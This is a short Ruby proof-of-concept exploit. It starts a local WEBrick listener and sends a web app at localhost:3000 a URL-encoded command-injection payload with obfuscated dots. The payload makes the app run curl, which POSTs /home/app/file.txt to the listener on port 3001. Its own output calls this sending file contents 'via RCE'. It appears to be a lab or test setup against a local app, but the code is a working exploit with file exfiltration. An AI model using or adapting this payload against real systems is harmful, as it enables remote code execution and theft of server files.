require "cgi"

require 'webrick'

log_file = File.open 'tmp/webrick.log', 'a+'
log = WEBrick::Log.new log_file

server = WEBrick::HTTPServer.new :Port => 3001, :AccessLog => [[log,WEBrick::AccessLog::COMBINED_LOG_FORMAT]], :Logger => log
trap 'INT' do server.shutdown end
Thread.start { server.start }


server.mount_proc '/' do |req, res|
  puts req.body
  res.body = ''
end

puts "send file contents to local web server via RCE:"
puts "-----------------------"
#shell_line=";curl -4 --silent --data-binary @../../../file.txt -X POST http://localhost:3001/dump"
shell_line=";curl -4 --silent --data-binary @/home/app/file.txt -X POST http://localhost:3001/dump"

DOT = "%%%x" % ".".each_byte.first

shell_line = CGI.escape(shell_line).gsub(".", DOT).gsub("+", "%20")

`curl -4 -i --silent "http://localhost:3000/cats/#{shell_line}"`

sleep 3
server.shutdown
puts "-----------------------"

